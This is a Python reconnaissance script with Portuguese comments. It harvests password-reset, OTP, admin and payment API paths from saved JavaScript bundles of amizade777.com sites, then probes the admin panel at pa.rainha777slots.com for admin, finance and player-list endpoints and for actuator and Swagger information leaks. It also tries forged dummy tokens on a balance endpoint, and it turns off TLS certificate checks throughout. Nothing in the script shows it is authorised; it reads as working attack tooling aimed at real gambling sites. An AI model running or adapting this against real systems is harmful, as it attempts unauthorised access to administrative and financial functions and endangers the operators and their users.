"""Busca endpoints de reset/senha/OTP no bundle + varredura do pa.rainha777slots.com"""
import re, json, urllib.request, urllib.error, ssl, time
from collections import defaultdict

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

# ─── PARTE 1: Bundle JS ───────────────────────────────────────────

print("=" * 60)
print("PARTE 1 — ENDPOINTS NO BUNDLE JS")
print("=" * 60)

bundles = [
    "bundles/ds.amizade777.com_index.76929613.js",
    "bundles/m.amizade777.com_index-e7dd841c.js",
]

all_paths = set()
for fp in bundles:
    try:
        with open(fp, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        # paths de API
        for m in re.finditer(r'["\']((/?(?:prod-api|japi|api)/[A-Za-z0-9/_\-\.]{3,80}))["\']', content):
            p = m.group(1)
            if not p.startswith("/"): p = "/" + p
            all_paths.add(p)
        # procura variáveis contendo paths compostos
        for m in re.finditer(r'url\s*[:=]\s*["`]([^"`\n]{10,100})["`]', content):
            v = m.group(1)
            if "/prod-api" in v or "/japi" in v:
                # extrai só o path
                mp = re.search(r'(/(?:prod-api|japi)/[A-Za-z0-9/_\-\.${}\s]{3,80})', v)
                if mp:
                    all_paths.add(mp.group(1).strip())
    except Exception as ex:
        print(f"  [erro ao ler {fp}]: {ex}")

# Categorizar por palavras-chave
keywords = {
    "reset/forget": ["reset", "forget", "forgot", "recover"],
    "password":     ["password", "passwd", "pwd", "senha"],
    "otp/sms":      ["otp", "sms", "verif", "code", "captcha"],
    "phone/bind":   ["phone", "mobile", "bind", "unbind"],
    "change/modify":["change", "modify", "update", "edit"],
    "admin/super":  ["admin", "super", "manage", "staff", "operator"],
    "transfer/pay": ["transfer", "withdraw", "recharge", "pay", "fund"],
}

hits = defaultdict(list)
for path in sorted(all_paths):
    pl = path.lower()
    for cat, kws in keywords.items():
        if any(k in pl for k in kws):
            hits[cat].append(path)

for cat, paths in hits.items():
    if paths:
        print(f"\n--- {cat} ---")
        for p in sorted(set(paths)):
            print(f"  {p}")

print(f"\n  Total único: {len(all_paths)}")

# ─── PARTE 2: pa.rainha777slots.com ──────────────────────────────

print("\n" + "=" * 60)
print("PARTE 2 — pa.rainha777slots.com")
print("=" * 60)

PA_HOST = "pa.rainha777slots.com"

def req(method, path, headers=None, body=None, host=PA_HOST):
    h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json, text/html, */*",
         "Origin": f"https://{host}", "Referer": f"https://{host}/"}
    if body is not None:
        h["Content-Type"] = "application/json"
    if headers:
        h.update(headers)
    data = json.dumps(body).encode() if body is not None else None
    url = f"https://{host}{path}"
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=8, context=ctx) as resp:
            raw = resp.read(16384).decode("utf-8", "ignore")
            return resp.status, dict(resp.headers), raw
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(4096).decode("utf-8","ignore") if e.fp else ""
    except Exception as ex:
        return 0, {}, f"<EXC: {ex}>"

# Teste básico
st, hdrs, raw = req("GET", "/")
print(f"\n  GET / → HTTP={st}")
if st == 200:
    print(f"  Server: {hdrs.get('Server','?')}")
    print(f"  Content-Type: {hdrs.get('Content-Type','?')}")
    print(f"  Primeiros 500 chars: {raw[:500]!r}")
elif st in (301, 302):
    print(f"  Location: {hdrs.get('Location','?')}")

time.sleep(1)

# Caminhos comuns de PA (painel administrativo)
pa_paths = [
    # raízes
    ("/",              "GET"),
    ("/login",         "GET"),
    ("/admin",         "GET"),
    ("/admin/login",   "GET"),
    ("/manage",        "GET"),
    ("/dashboard",     "GET"),
    ("/index",         "GET"),
    ("/api",           "GET"),
    ("/api/login",     "POST"),
    # API admin
    ("/api/admin/login",              "POST"),
    ("/api/admin/player/list",        "GET"),
    ("/api/admin/finance",            "GET"),
    ("/api/admin/recharge/list",      "GET"),
    ("/api/admin/withdraw/list",      "GET"),
    ("/prod-api/admin/player/list",   "GET"),
    ("/prod-api/admin/finance",       "GET"),
    ("/japi/admin/user/list",         "GET"),
    # info disclosure
    ("/actuator/health",  "GET"),
    ("/actuator/env",     "GET"),
    ("/actuator/mappings","GET"),
    ("/v2/api-docs",      "GET"),
    ("/v3/api-docs",      "GET"),
    ("/swagger-ui.html",  "GET"),
    ("/swagger",          "GET"),
    # check-ins e config
    ("/prod-api/set/get",  "POST"),
    ("/prod-api/set/mains","POST"),
    ("/japi/user/balance/querySimpleBalance", "GET"),
]

print("\n  Varrendo paths em pa.rainha777slots.com...")
interesting = []
for path, method in pa_paths:
    body = {"appChannel":"pc","appVersion":"1.0.0","appPackageName":"com.slots.big"} if method == "POST" else None
    st, hdrs, raw = req(method, path, body=body)
    ct = hdrs.get("Content-Type","")
    # descarta apenas 404 "puro"
    is_boring = (st in (404,) and "not found" in raw.lower()[:100])
    if not is_boring:
        try:
            j = json.loads(raw)
            code = j.get("code")
            msg  = str(j.get("msg",""))[:50]
            result = f"code={code} msg={msg!r}"
            is_interesting = code == 200 or (code and code not in (102008,102009,400,401,403,404))
        except Exception:
            code = None
            result = raw[:200].replace("\n"," ")
            is_interesting = st in (200, 302) and len(raw.strip()) > 50
        if is_interesting or st in (200, 301, 302):
            interesting.append((method, path, st, result))
            flag = " *** INTERESSA ***" if st == 200 or code == 200 else ""
            print(f"  [{method:5} {st:3}] {path:50} {result}{flag}")
    time.sleep(0.5)

print(f"\n  {len(interesting)} paths interessantes no PA")

# Token anão no PA
print("\n  Testando token anão no PA...")
for tok in [1, "zzz"]:
    st, _, raw = req("GET", "/japi/user/balance/querySimpleBalance",
                     headers={"Token": str(tok)})
    try:
        j = json.loads(raw)
        print(f"  Token={tok!r}: code={j.get('code')} data={j.get('data')}")
    except Exception:
        print(f"  Token={tok!r}: HTTP={st} raw={raw[:100]!r}")
    time.sleep(0.8)
